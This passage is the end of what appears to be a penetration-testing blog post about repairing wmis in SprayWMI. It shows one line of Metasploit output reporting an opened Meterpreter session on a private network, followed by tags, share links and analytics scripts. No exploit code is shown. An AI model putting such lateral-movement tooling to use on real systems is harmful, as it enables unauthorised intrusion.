<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Meterpreter</span> <span class="n">session</span> <span class="m">1</span> <span class="n">opened</span> <span class="p">(</span><span class="m">192.168.1.193</span><span class="p">:</span><span class="m">443</span> <span class="n">-</span><span class="err">&gt;</span> <span class="m">192.168.1.86</span><span class="p">:</span><span class="m">58170</span><span class="p">)</span> <span class="n">at</span> <span class="m">2015-12-13</span> <span class="m">16</span><span class="p">:</span><span class="m">20</span><span class="p">:</span><span class="m">58</span> <span class="m">-0700</span></code></pre></figure> <div class="entry-meta">  <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#SprayWMI" title="Pages tagged SprayWMI" class="tag"><span class="term">SprayWMI</span></a><a href="http://localhost:4000/tags/#Kali" title="Pages tagged Kali" class="tag"><span class="term">Kali</span></a><a href="http://localhost:4000/tags/#wmis" title="Pages tagged wmis" class="tag"><span class="term">wmis</span></a><a href="http://localhost:4000/tags/#WMI" title="Pages tagged WMI" class="tag"><span class="term">WMI</span></a><a href="http://localhost:4000/tags/#libgnutls.so.26" title="Pages tagged libgnutls.so.26" class="tag"><span class="term">libgnutls.so.26</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/fixing-wmis-in-spraywmi/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/fixing-wmis-in-spraywmi/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/fixing-wmis-in-spraywmi/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>  </body>
</html>
